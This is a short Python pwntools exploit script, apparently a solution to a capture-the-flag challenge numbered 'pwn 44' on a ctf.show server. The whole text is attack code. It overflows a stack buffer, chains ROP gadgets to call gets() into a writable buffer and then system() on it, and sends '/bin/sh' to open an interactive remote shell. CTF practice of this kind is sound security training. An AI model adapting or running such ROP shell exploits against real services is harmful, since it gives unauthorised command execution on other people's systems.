#pwn 44
from pwn import *
context.log_level = 'debug'
p = remote('pwn.challenge.ctf.show',28202)

offset = 0xA + 0x8
sys_addr = 0x400520
buf_addr = 0x602080
gets_addr = 0x400530
ret_addr = 0x4004fe
rdi_addr = 0x4007f3

payload = b'a' * offset + p64(rdi_addr) + p64(buf_addr) + p64(ret_addr) + p64(gets_addr)
payload += p64(rdi_addr) + p64(buf_addr) + p64(ret_addr) + p64(sys_addr)

p.recv()
p.sendline(payload)
p.sendline("/bin/sh")
p.interactive()
